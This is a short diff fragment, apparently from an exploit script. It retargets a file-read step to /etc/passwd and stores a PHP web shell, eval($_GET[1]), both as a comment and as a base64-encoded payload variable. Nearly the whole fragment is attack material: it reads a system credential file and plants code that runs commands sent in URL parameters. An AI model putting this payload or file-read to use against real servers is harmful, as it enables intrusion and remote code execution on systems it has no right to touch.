@@ -1,4 +1,4 @@
-file_to_use = "./init"
+file_to_use = "/etc/passwd"
 
 #<?php eval($_GET[1]);?>a
 base64_payload = "PD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5h"
